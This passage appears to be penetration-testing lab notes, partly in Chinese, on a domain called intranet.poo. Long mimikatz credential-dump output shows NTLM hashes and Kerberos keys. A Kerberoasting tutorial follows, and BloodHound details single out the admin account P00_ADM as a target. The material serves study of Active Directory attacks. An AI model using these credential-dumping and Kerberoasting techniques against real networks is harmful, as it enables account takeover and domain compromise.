         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 80336 (00000000:000139d0)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:11 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 46991 (00000000:0000b78f)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:10 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : COMPATIBILITY$
Domain            : POO
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:09 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : compatibility$
         * Domain   : INTRANET.POO
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 396297 (00000000:00060c09)
Session           : Interactive from 0
User Name         : POO_PUBLIC18
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1020
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC18
         * Domain   : COMPATIBILITY
         * NTLM     : eb2f582902e6564fd7cbaace3988a452
         * SHA1     : 814dad8ccb752e1265dee59781beef234dcc9c3a
         * DPAPI    : 814dad8ccb752e1265dee59781beef23
        tspkg :
        wdigest :
         * Username : POO_PUBLIC18
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC18
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 395608 (00000000:00060958)
Session           : Interactive from 0
User Name         : POO_PUBLIC15
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1017
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC15
         * Domain   : COMPATIBILITY
         * NTLM     : 3e5794d444d5ba749132ea93cb721b7c
         * SHA1     : 8c2441c26f726638a09d2471b5ae91b5873f264a
         * DPAPI    : 8c2441c26f726638a09d2471b5ae91b5
        tspkg :
        wdigest :
         * Username : POO_PUBLIC15
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC15
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 394971 (00000000:000606db)
Session           : Interactive from 0
User Name         : POO_PUBLIC12
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1014
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC12
         * Domain   : COMPATIBILITY
         * NTLM     : ac89c4c406747afaa04b07f39889985f
         * SHA1     : d4e5bb6c8c1d0a7006c96f7183bf232381a070f7
         * DPAPI    : d4e5bb6c8c1d0a7006c96f7183bf2323
        tspkg :
        wdigest :
         * Username : POO_PUBLIC12
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC12
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 394297 (00000000:00060439)
Session           : Interactive from 0
User Name         : POO_PUBLIC09
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1011
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC09
         * Domain   : COMPATIBILITY
         * NTLM     : c670d13961c29508381c0e121b8270c2
         * SHA1     : d5bb03837040afca88d79816e6c5ead7bdc38363
         * DPAPI    : d5bb03837040afca88d79816e6c5ead7
        tspkg :
        wdigest :
         * Username : POO_PUBLIC09
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC09
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 393998 (00000000:0006030e)
Session           : Interactive from 0
User Name         : POO_PUBLIC08
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1010
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC08
         * Domain   : COMPATIBILITY
         * NTLM     : 157332d85d901b3a0adfca7fbbcd6af5
         * SHA1     : 782daa13475aa13cf996f91199a82721907c0cf5
         * DPAPI    : 782daa13475aa13cf996f91199a82721
        tspkg :
        wdigest :
         * Username : POO_PUBLIC08
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC08
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 393580 (00000000:0006016c)
Session           : Interactive from 0
User Name         : POO_PUBLIC06
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1008
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC06
         * Domain   : COMPATIBILITY
         * NTLM     : f58bc106ba870fec60e50481f768f942
         * SHA1     : 0cbf8d532c7e9135128dd39e206791a645c22b39
         * DPAPI    : 0cbf8d532c7e9135128dd39e206791a6
        tspkg :
        wdigest :
         * Username : POO_PUBLIC06
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC06
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 126018 (00000000:0001ec42)
Session           : Service from 0
User Name         : MSSQL$POO_PUBLIC
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:12 AM
SID               : S-1-5-80-4078066653-3512796471-551061035-3947311196-544738325
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : INTRANET.POO
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 125990 (00000000:0001ec26)
Session           : Service from 0
User Name         : MSSQL$POO_CONFIG
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:12 AM
SID               : S-1-5-80-2936918156-3707045834-1705049055-2109153975-4014401946
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : COMPATIBILITY$
Domain            : POO
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:10 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : compatibility$
         * Domain   : INTRANET.POO
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 45040 (00000000:0000aff0)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:09 AM
SID               :
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 18155985 (00000000:011509d1)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 2/3/2026 6:00:27 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 396733 (00000000:00060dbd)
Session           : Interactive from 0
User Name         : POO_PUBLIC20
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1022
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC20
         * Domain   : COMPATIBILITY
         * NTLM     : 0e20a30da1637d53042d253d99e416ed
         * SHA1     : f7e0db91a23846b7571e72e857c3d3ca1aa2d9eb
         * DPAPI    : f7e0db91a23846b7571e72e857c3d3ca
        tspkg :
        wdigest :
         * Username : POO_PUBLIC20
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC20
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 395394 (00000000:00060882)
Session           : Interactive from 0
User Name         : POO_PUBLIC14
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1016
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC14
         * Domain   : COMPATIBILITY
         * NTLM     : d8225db19d4d17aec00bcddbc7f51b8c
         * SHA1     : b5eb815a9779c6f2cb286f1b700a9430e4c479ef
         * DPAPI    : b5eb815a9779c6f2cb286f1b700a9430
        tspkg :
        wdigest :
         * Username : POO_PUBLIC14
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC14
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 394533 (00000000:00060525)
Session           : Interactive from 0
User Name         : POO_PUBLIC10
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1012
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC10
         * Domain   : COMPATIBILITY
         * NTLM     : c0b62fb43b73abe7b6c31dbf881e747b
         * SHA1     : 8101ac9f71ce1fda42940e7ff2997a4ff9cfa12f
         * DPAPI    : 8101ac9f71ce1fda42940e7ff2997a4f
        tspkg :
        wdigest :
         * Username : POO_PUBLIC10
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC10
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 393136 (00000000:0005ffb0)
Session           : Interactive from 0
User Name         : POO_PUBLIC04
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1006
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC04
         * Domain   : COMPATIBILITY
         * NTLM     : 25f6a1404e10a114ec112649e7651ac0
         * SHA1     : e7c7f4a47b97c6ade4a19e6aa84c2d366c2f914e
         * DPAPI    : e7c7f4a47b97c6ade4a19e6aa84c2d36
        tspkg :
        wdigest :
         * Username : POO_PUBLIC04
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC04
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 392128 (00000000:0005fbc0)
Session           : Interactive from 0
User Name         : POO_PUBLIC00
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1002
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC00
         * Domain   : COMPATIBILITY
         * NTLM     : 42cc6a0e40743e9cb29411a68a4513c0
         * SHA1     : aea792cc6c4131207a505736e5f4d4c048cca5d0
         * DPAPI    : aea792cc6c4131207a505736e5f4d4c0
        tspkg :
        wdigest :
         * Username : POO_PUBLIC00
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC00
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 126222 (00000000:0001ed0e)
Session           : Service from 0
User Name         : SQLTELEMETRY$POO_PUBLIC
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:12 AM
SID               : S-1-5-80-2289724118-3709992960-1711458084-1804885650-1488345318
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 80282 (00000000:0001399a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:11 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:10 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!

```

## <font style="color:rgb(13, 13, 13);">Kerberoast</font>
**有 SPN + 是 User + 不带**** **`**<font style="background-color:rgb(236, 236, 236);">$</font>**`** ****= Kerberoast**

### 一、什么是 SPN（Service Principal Name）
一句人话版：

**SPN = “某个账号负责跑某个服务”的登记名**

举个例子：

```plain
MSSQLSvc/sql01.intranet.poo:1433
HTTP/web.intranet.poo
```

这些字符串本质是在说：

👉 “这个服务是用某个账号启动的”

而这个“账号”，**可以是**：

+ 用户账号（User）
+ 机器账号（Computer$）

---

### 二、为什么「有 SPN」是前提？
因为 **Kerberoast 的对象不是“人”，是“服务”**。

Kerberos 的流程里：

+ 你访问一个 **带 SPN 的服务**
+ DC 会给你一个 **服务票据（TGS）**
+ 这个 TGS 是：
    - 用 **服务账号的密钥** 加密的

👉 **只要你能拿到这个 TGS，你就能离线爆破它**

所以：

❗ 没 SPN → 没服务 → 没 TGS → 无法 Kerberoast

---

### 三、为什么必须是 User，而不是 Computer（$）
这是重点。

#### 1️⃣ User 账户的密码特点
+ 通常：
    - 人设置的
    - 可能弱
    - 很久不换
+ **Kerberoast 本质是：离线爆破服务账号密码**

所以 User = 爆破价值高

---

#### 2️⃣ Computer$ 账户的密码特点
+ 自动生成
+ **随机 120 字符左右**
+ 每 30 天自动轮换
+ 基本不可能爆破

所以：

即使 Computer$ 也有 SPN  
👉 **理论上能 Kerberoast，但实际上没意义**

---

#### 3️⃣ 为什么口诀里说「不带 `$`」
在 AD 里：

+ **带 **`**$**`** 的几乎一定是机器账号**
+ **不带 **`**$**`** 的几乎一定是用户账号**

所以：

```plain
sqlsvc          ← User（重点关注）
DC01$           ← Computer（一般跳过）
```

## P00_ADM@INTRANET.POO
```plain
P00_ADM@INTRANET.POO
Node Type:
User
Tier Zero:
TRUE
Object ID:
S-1-5-21-2413924783-1155145064-2969042445-1107
ACL Inheritance Denied:
TRUE
Admin Count:
TRUE
Allows Unconstrained Delegation:
FALSE
Created:
2018-03-22 05:07 GMT+8 (GMT+0800)
Distinguished Name:
CN=P00_ADM,CN=USERS,DC=INTRANET,DC=POO
Do Not Require Pre-Authentication:
FALSE
Domain FQDN:
INTRANET.POO
Domain SID:
S-1-5-21-2413924783-1155145064-2969042445
Enabled:
TRUE
Last Collected by BloodHound:
2026-02-03T13:16:01.959595224Z
Last Logon (Replicated):
2026-02-03 17:11 GMT+8 (GMT+0800)
Last Logon:
2026-02-03 17:22 GMT+8 (GMT+0800)
Last Seen by BloodHound:
2026-02-03 21:16 GMT+8 (GMT+0800)
Locked Out:
FALSE
Logon Script Enabled:
FALSE
Marked Sensitive:
FALSE
Owner SID:
S-1-5-21-2413924783-1155145064-2969042445-512
Password Expired:
FALSE
Password Last Set:
2018-05-11 11:26 GMT+8 (GMT+0800)
Password Never Expires:
TRUE
Password Not Required:
FALSE
Password Stored Using Reversible Encryption:
FALSE
SAM Account Name:
p00_adm
Service Principal Names:
cyber_audit/intranet.poo:443
Smartcard Required:
FALSE
Supported Kerberos Encryption Types:
Not defined
Trusted For Constrained Delegation:
FALSE
Use DES Key Only:
FALSE
User Account Control:
66048
User Cannot Change Password:
FALSE
```

### <font style="color:rgb(13, 13, 13);">① 它是</font><font style="color:rgb(13, 13, 13);"> </font>**User，不是 Computer**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">✅</font>
```plain
Node Type: User
SAM Account Name: p00_adm
```

<font style="color:rgb(13, 13, 13);">✔</font><font style="color:rgb(13, 13, 13);"> Kerberoast</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">只能打 User</font>**<font style="color:rgb(13, 13, 13);">  
</font><font style="color:rgb(13, 13, 13);">❌</font><font style="color:rgb(13, 13, 13);"> Computer（</font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">$</font>**`<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">结尾）直接忽略</font>

---

### <font style="color:rgb(13, 13, 13);">② 它有</font><font style="color:rgb(13, 13, 13);"> </font>**SPN（这是 Kerberoast 的开关）**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">🔥</font>
```plain
Service Principal Names:
cyber_audit/intranet.poo:443
```

<font style="color:rgb(13, 13, 13);">这句是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">铁证</font>**<font style="color:rgb(13, 13, 13);">。</font>

**有 SPN = Kerberos 会给你 TGS**

**TGS = 可离线爆破的 hash**

---

### <font style="color:rgb(13, 13, 13);">③ 它是</font><font style="color:rgb(13, 13, 13);"> </font>**Tier Zero / AdminCount = TRUE**<font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">💣</font>
```plain
Tier Zero: TRUE
Admin Count: TRUE
```

<font style="color:rgb(13, 13, 13);">这意味着：</font>

+ <font style="color:rgb(13, 13, 13);">这是</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域级高权限账号</font>**
